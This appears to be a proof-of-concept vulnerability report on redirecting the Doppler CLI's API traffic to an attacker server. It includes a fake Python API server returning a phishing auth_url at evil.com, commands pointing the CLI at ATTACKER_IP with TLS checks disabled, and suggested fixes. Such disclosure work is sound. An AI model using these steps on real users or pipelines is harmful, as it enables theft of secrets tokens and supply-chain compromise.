# PoC: Doppler CLI API Host Redirection Attack

## Overview
The Doppler CLI allows users to redirect all API traffic to an attacker-controlled server via the `--api-host` flag or `DOPPLER_API_HOST` environment variable. Combined with `--no-verify-tls`, this enables token interception during the auth flow.

## Attack Vector
An attacker who can influence the CLI configuration (e.g., via a poisoned `.doppler.yaml` in a shared repo, or by setting environment variables in a CI/CD pipeline) can redirect the auth token exchange to their server.

## Reproduction Steps

### 1. Set up a malicious API server
```bash
# On attacker's server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/v3/auth/cli/generate' in self.path:
            response = {
                'code': 'fake_code',
                'polling_code': 'fake_polling_code',
                'auth_url': 'https://evil.com/phish'
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(200)
            self.end_headers()
    def log_message(self, format, *args):
        print(f'[ATTACKER] {args[0]}')

HTTPServer(('0.0.0.0', 8443), Handler).serve_forever()
" &
```

### 2. Redirect CLI to malicious server
```bash
# Via environment variable
export DOPPLER_API_HOST=http://ATTACKER_IP:8443

# Or via config flag
doppler login --api-host http://ATTACKER_IP:8443 --no-verify-tls
```

### 3. Observe token interception
The attacker's server receives the polling code and can:
- Return a phishing `auth_url` to steal credentials
- Return a valid-looking token response to maintain persistence

## Impact
- **Token Theft**: Attacker gains full access to user's Doppler secrets
- **Lateral Movement**: Stolen token provides access to all projects/configs the user can access
- **Supply Chain Risk**: Poisoned config files in repos could affect all developers

## Root Cause
1. No validation of `--api-host` value against allowlist
2. No warning when API host differs from default (`api.doppler.com`)
3. Auth flow trusts `auth_url` from API response without validation
4. `--no-verify-tls` disables all TLS verification

## Suggested Fix
- Add warning when `--api-host` is not the default
- Validate `auth_url` is on a trusted domain before opening
- Consider certificate pinning for the default API host
- Log when non-default API host is used
